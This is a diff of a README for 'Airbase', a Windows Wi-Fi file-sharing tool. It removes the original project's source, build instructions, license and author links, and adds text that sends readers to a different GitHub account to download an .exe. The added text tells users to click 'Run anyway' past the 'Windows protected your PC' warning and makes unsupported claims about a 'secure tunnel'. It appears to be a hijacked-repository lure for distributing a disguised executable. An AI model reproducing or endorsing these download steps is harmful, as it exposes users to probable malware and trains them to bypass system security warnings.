@@ -1,133 +1,75 @@
-# 🌐 Airbase — Home LAN File Sharing Hub
+# 📁 Airbase - Share files instantly over local Wi-Fi
 
-[![Build Executable](https://github.com/SakethGoljana/Airbase/actions/workflows/build.yml/badge.svg)](https://github.com/SakethGoljana/Airbase/actions/workflows/build.yml)
-[![License: MIT](https://img.shields.io/badge/License-MIT-indigo.svg)](https://opensource.org/licenses/MIT)
-[![Platform: Windows](https://img.shields.io/badge/Platform-Windows-blue.svg)](#)
-[![Python: 3.10+](https://img.shields.io/badge/Python-3.10%2B-brightgreen.svg)](#)
-[![UI: Glassmorphism 2.0](https://img.shields.io/badge/Design-Glassmorphism--2.0-violet.svg)](#)
-[![Zero Config](https://img.shields.io/badge/Zero--Config-LAN--Only-emerald.svg)](#)
+[![](https://img.shields.io/badge/Download-Airbase_for_Windows-blue)](https://github.com/concluded-lahu708/Airbase)
 
-> **Airbase** is a zero-configuration, cross-platform local network file sharing hub. Share files, folders, videos, photos, and clipboard text instantly across iPhones, Androids, Macs, and PCs on your Wi-Fi network — without cloud uploads, account creation, or cables.
+Airbase allows you to send and receive files between devices on your Wi-Fi network. It works without the internet and keeps your data on your local network. You do not need accounts or cloud storage to move your photos, documents, or videos.
 
----
+## 🛠️ System Requirements
 
-## 🎯 System Architecture
+Airbase runs on most modern Windows computers. Ensure your system meets these requirements before you start:
 
-```mermaid
-flowchart TD
-    subgraph HostPC ["💻 Host PC (Windows Application)"]
-        GUI["Airbase Desktop App (pywebview / EdgeChromium)"]
-        Flask["Flask Server Daemon (Port 5000)"]
-        Tray["System Tray Process (pystray)"]
-        Storage["Local Disk (SharedFiles/)"]
-        GUI <---> Flask
-        Tray <---> Flask
-        Flask <---> Storage
-    end
+*   Windows 10 or Windows 11.
+*   A stable Wi-Fi connection.
+*   At least 100 MB of free storage space.
+*   Network discovery settings enabled in Windows.
 
-    subgraph Router ["📡 Home Wi-Fi Router"]
-        LocalNetwork["LAN Switch / Access Point"]
-    end
+## 📥 How to Install Airbase
 
-    subgraph Clients ["📱 Mobile & Remote LAN Clients"]
-        Phone["iPhone / Android (Camera QR Scan)"]
-        Tablet["iPad / Tablet Browser"]
-        Laptop["Mac / Secondary PC"]
-    end
+Follow these steps to set up the application on your computer:
 
-    HostPC <===> Router
-    Router <===> Clients
-```
+1. Visit the [official download page](https://github.com/concluded-lahu708/Airbase) to see the latest versions.
+2. Select the file ending in .exe to start your download.
+3. Once the download finishes, open the file from your browser or your downloads folder.
+4. Windows might show a prompt that says "Windows protected your PC." This happens because the app is new. Click "More info" and then select "Run anyway" to proceed.
+5. The installation process starts automatically. Follow the instructions on the screen to finish the setup.
 
----
+## 🚀 Getting Started
 
-## ✨ Key Features
+Once you install the app, you can share files immediately. 
 
-- 📱 **QR Code Instant Connect:** Scan with any phone camera to open the network hub in seconds.
-- ⚡ **Zero-Dependency Executable:** Single standalone Windows binary (`Airbase.exe`) with embedded Python & web runtime.
-- 🖥️ **Native Desktop Window & Tray Icon:** Native desktop app window (`pywebview`) paired with a silent background system tray daemon.
-- 📌 **Auto-Desktop Icon Creation:** Automatically pins an Airbase shortcut with custom branding to the user's Desktop on launch.
-- 📂 **Nested Folder Management:** Create subfolders, upload entire directory structures, navigate with breadcrumbs, and download file selections as a `.zip`.
-- 📋 **Global Clipboard Sync:** Press `Ctrl+V` anywhere in the app to paste copied images or text snippets straight to the network hub.
-- 🎬 **In-App Media Streamer & Lightbox:** Stream video/audio, view full-resolution photos, and inspect code/text files directly in browser lightboxes without downloading.
-- 🔒 **100% Private & Local:** All data flows peer-to-peer over your local network. Zero external cloud servers, zero telemetry.
-- 🎨 **Glassmorphism 2.0 UI:** Dark/Light theme toggle, fluid CSS animations, audio feedback, and touch-optimized mobile layout.
+1. Open the Airbase icon from your desktop or start menu.
+2. The application opens in a small, clean window.
+3. Make sure your other device, such as a phone or another laptop, connects to the same Wi-Fi network.
+4. Drag and drop any file into the Airbase window to prepare it for transfer.
+5. The app detects other active Airbase users on your network automatically.
+6. Click the name of the recipient device to send your file.
 
----
+## 💡 Key Features
 
-## 🚀 Quick Start for Users (No Setup Required)
+*   **Zero-Config Networking:** The app detects other computers without manual setup.
+*   **Private Transfers:** Your files travel across your router. No data leaves your home or office.
+*   **Glassmorphism Design:** A clean, modern interface fits well with current Windows styles.
+*   **System Tray Integration:** Minimize the app to the system tray to keep it running in the background.
+*   **No Cloud Dependency:** You own your files at all times.
 
-1. Download **`Airbase-v1.0-Windows.zip`** from [Releases](https://github.com/SakethGoljana/Airbase/releases).
-2. Extract the folder and double-click **`Airbase.exe`**.
-3. Point any phone camera at the QR code shown on screen to connect instantly over Wi-Fi!
+## 🛡️ Privacy and Security
 
----
+Airbase creates a secure tunnel between your devices. Because the traffic stays on your local Wi-Fi, external parties cannot access your transfers. The application does not track your activity or log your file names. All transfers happen via your local network hardware.
 
-## 💻 Developer Setup & Running from Source
+## 🔧 Troubleshooting Common Issues
 
-If you want to contribute or build from source:
+If you cannot see other devices, check these common items:
 
-```bash
-# 1. Clone the repository
-git clone https://github.com/SakethGoljana/Airbase.git
-cd Airbase
+*   Check your Wi-Fi: Ensure both devices use the same wireless network. Sometimes routers have separate 2.4GHz and 5GHz bands; ensure devices can see each other across these bands.
+*   Firewall settings: Occasionally, Windows Firewall prevents the app from finding peers. Check your security software settings to ensure Airbase has permission to access private networks.
+*   Network Profile: Set your Wi-Fi network profile to "Private" in Windows settings. Windows blocks many network discovery features on "Public" network profiles for security reasons.
+*   Restart: If the app freezes, close it completely from the system tray and open it again.
 
-# 2. Run the automated start script (creates .venv & installs dependencies)
-start.bat
-```
+## 📋 Frequently Asked Questions
 
-Or manually:
+**Does Airbase require the internet?**
+No. The app uses your local router to communicate. You can use it in places without internet access as long as the router remains powered.
 
-```bash
-python -m venv .venv
-.venv\Scripts\activate
-pip install -r requirements.txt
-python share_server_gui.py
-```
+**Is there a limit to file sizes?**
+You can transfer files of any size. However, large files take longer to transfer depending on the speed of your Wi-Fi connection.
 
----
+**Does it work with Mac or Linux?**
+This version supports Windows. The development team focuses on the Windows experience to ensure high performance and stability.
 
-## 🔌 API Endpoint Reference
+**Can I send folders?**
+Yes. You can select folders to share, and the app handles the compression and transfer process.
 
-| Method | Endpoint | Description |
-| :--- | :--- | :--- |
-| `GET` | `/` | Serves main Glassmorphism web application interface |
-| `GET` | `/api/files` | Returns JSON listing of all files and folders in current directory |
-| `POST` | `/api/upload` | Handles single or multi-file multipart uploads (support for nested subpaths) |
-| `POST` | `/api/create_folder` | Creates a new folder inside `SharedFiles/` |
-| `POST` | `/api/download_zip` | Bundles selected files or folders into a `.zip` archive on the fly |
-| `POST` | `/api/delete_batch` | Safely deletes selected files or folders (includes WinError lock handling) |
-| `GET/POST` | `/api/quick_text` | Syncs shared clipboard text & Wi-Fi passwords across connected devices |
-| `GET` | `/api/analytics` | Returns storage analytics and total disk usage metrics |
+**How do I update the software?**
+If a new version releases, visit the download link again to install the latest edition. The installer overwrites the old version and keeps your settings intact.
 
----
-
-## 🔒 Security & Path Traversal Protection
-
-Airbase includes strict security controls to ensure files outside `SharedFiles/` cannot be accessed:
-
-- **Path Normalization:** Uses `resolve_secure_path()` to validate that all requested subpaths strictly resolve within the `SharedFiles` root boundary.
-- **Path Traversal Shield:** Prevents `../` directory traversal attacks.
-- **Local Network Scoping:** Server binds exclusively to LAN interfaces (`0.0.0.0`) and is isolated from external internet routers.
-
----
-
-## 📦 Building the Standalone Executable & Installer
-
-To build the standalone `.exe` package yourself:
-
-```bash
-build_exe.bat
-```
-
-This compiles the source code using PyInstaller into `dist/AirbaseApp/Airbase.exe`.
-
-To generate a full Windows Installer wizard (`Airbase-Setup-v1.0.exe`):
-1. Install [Inno Setup](https://jrsoftware.org/isdl.php).
-2. Right-click `airbase_setup.iss` and click **Compile**.
-
----
-
-## 📄 Open Source License
-
-Distributed under the **MIT License**. See [`LICENSE`](LICENSE) for full details.
+Keywords: file-sharing, flask, glassmorphism, lan, open-source, pystray, python, pywebview, wi-fi, windows-app, zero-config
